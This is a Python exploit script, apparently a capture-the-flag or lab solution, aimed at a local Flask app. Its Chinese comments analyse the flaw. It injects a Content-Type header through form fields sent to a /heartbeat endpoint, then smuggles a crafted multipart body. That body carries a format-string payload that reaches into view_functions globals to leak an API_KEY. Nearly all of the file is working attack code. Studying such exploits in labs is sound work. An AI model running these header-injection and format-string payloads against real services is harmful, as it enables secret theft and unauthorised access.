import httpx
from io import BytesIO

TARGET = "http://127.0.0.1:5000"

# 核心漏洞分析：
# 1. heartbeat 会用 data=params 发送表单数据
# 2. 我们可以通过 client=Content-Type 和 token=... 来覆盖 Content-Type
# 3. httpx 会根据这个 Content-Type 解析 boundary 并生成 multipart body
# 4. /action 使用 request.files.get('content') 和 request.files.get('action')

# 关键：当我们覆盖 Content-Type 时，httpx 会用我们指定的 boundary
# 但 body 是从 data=params 生成的，是 url-encoded 形式的！

# 让我验证这个假设

BOUNDARY = "CUSTOM_BOUNDARY"

# 测试1: 正常请求 (不覆盖 Content-Type)
print("=== Test 1: Normal request ===")
params = {
    'text': 'hello',
    'client': 'X-Custom',
    'token': 'value'
}
try:
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:200]}")
except Exception as e:
    print(f"Error: {e}")

# 测试2: 覆盖 Content-Type 为 multipart
print("\n=== Test 2: Override Content-Type to multipart ===")
params2 = {
    'text': f'PAYLOAD_HERE',
    'client': 'Content-Type',
    'token': f'multipart/form-data; boundary={BOUNDARY}'
}
try:
    r = httpx.post(f"{TARGET}/heartbeat", data=params2, timeout=5.0)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:500]}")
except Exception as e:
    print(f"Error: {e}")

# 测试3: 构造完整的 multipart payload 在 text 中
print("\n=== Test 3: Full multipart in text ===")
multipart_payload = (
    f'--{BOUNDARY}\r\n'
    f'Content-Disposition: form-data; name="content"; filename="content"\r\n'
    f'Content-Type: text/plain\r\n\r\n'
    f'{{0.view_functions[action].__globals__[API_KEY]}}\r\n'  # format string payload
    f'--{BOUNDARY}\r\n'
    f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
    f'Content-Type: text/json\r\n\r\n'
    f'{{"type": "debug"}}\r\n'
    f'--{BOUNDARY}--'
)
params3 = {
    'text': multipart_payload,
    'client': 'Content-Type',
    'token': f'multipart/form-data; boundary={BOUNDARY}'
}
try:
    r = httpx.post(f"{TARGET}/heartbeat", data=params3, timeout=5.0)
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:500]}")
except Exception as e:
    print(f"Error: {e}")
